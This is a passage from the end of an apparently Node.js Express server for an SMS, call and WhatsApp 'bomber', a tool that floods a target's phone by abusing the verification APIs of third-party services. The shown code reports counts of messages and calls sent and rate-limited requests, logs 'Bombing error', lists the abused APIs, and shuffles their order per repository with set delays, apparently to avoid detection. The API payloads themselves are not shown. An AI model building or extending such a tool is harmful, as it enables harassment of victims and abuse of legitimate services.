            requested_duration: requestedDuration, effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success, sms: result.smsCount, calls: result.callCount, whatsapp: result.whatsappCount,
            rate_limited: result.rateLimited, rejected: result.rejected, failed: result.failed,
            elapsed: result.elapsed + 's', total_apis: uniqueApis.length, api_delay_ms: API_DELAY_MS
        });
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        repo: REPO_NAME, total: uniqueApis.length, normal: NORMAL_APIS.length, rate_limited: RATE_LIMIT_APIS.length,
        sequence_first_10: REPO_SEQUENCE.slice(0, 10).map(a => a.name),
        normal_api_names: NORMAL_APIS.map(a => a.name),
        rate_limited_api_names: RATE_LIMIT_APIS.map(a => a.name)
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 ${REPO_NAME} | API Server on port ${PORT}`);
    console.log(`📊 Total: ${uniqueApis.length} APIs (SAME as original)`);
    console.log(`🔀 Repo-specific shuffle: First API = ${REPO_SEQUENCE[0].name}`);
    console.log(`⏱️ API Delay: ${API_DELAY_MS}ms (5 sec min)`);
    console.log('═══════════════════════════════════════════');
});
